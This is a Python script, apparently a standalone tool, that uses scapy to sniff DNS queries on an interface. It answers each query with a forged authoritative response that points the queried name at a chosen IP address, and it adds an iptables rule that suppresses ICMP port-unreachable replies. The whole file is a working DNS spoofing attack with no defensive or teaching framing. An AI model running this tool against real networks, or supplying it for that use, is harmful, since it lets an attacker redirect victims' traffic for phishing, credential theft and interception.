#!/usr/bin/python3

import argparse
from scapy.all import *
import subprocess

def dns_spoof(pkt, target_ip):
    payload = pkt[Raw].load
    dns = DNS(payload)
    if DNSQR in dns and dns.opcode == 0:
        spoofed_pkt = IP(id=1, dst=pkt[IP].src, src=pkt[IP].dst)/\
             UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
             DNS(id=dns.id, qd=dns.qd, aa=1, qr=1, an=DNSRR(rrname=dns[DNSQR].qname, ttl=64, rdata=target_ip))
        spoofed_pkt.chksum = None  
        spoofed_pkt = spoofed_pkt.__class__(bytes(spoofed_pkt))
        send(spoofed_pkt, verbose=0)  
        
        #spoofed_pkt.show()
        print("DNS packet intercepted and false response sent")

def main():
    parser = argparse.ArgumentParser(description="Fake DNS server")
    parser.add_argument("-p", "--port", type=int, default=0, help="Port number (default '0' for all ports)")
    parser.add_argument("target_ip", type=str, help="Target IP address for DNS response")
    args = parser.parse_args()

    if args.port == 0:
        packet_filter = " and ".join([
            "udp and portrange 0-65535",            # Filter UDP port
            "udp[10] & 0x80 = 0",                   # DNS queries only
            ])
    else:
        packet_filter = " and ".join([
            f"udp dst port {args.port}",            # Filter UDP port
            "udp[10] & 0x80 = 0",                   # DNS queries only
            ])

    command = ["iptables", "-I", "OUTPUT", "-p", "icmp", "--icmp-type", "port-unreachable", "-j", "DROP"]
    subprocess.run(command, check=True)
    sniff(filter=packet_filter, prn=lambda pkt: dns_spoof(pkt, args.target_ip), iface="eth0")

if __name__ == "__main__":
    main()
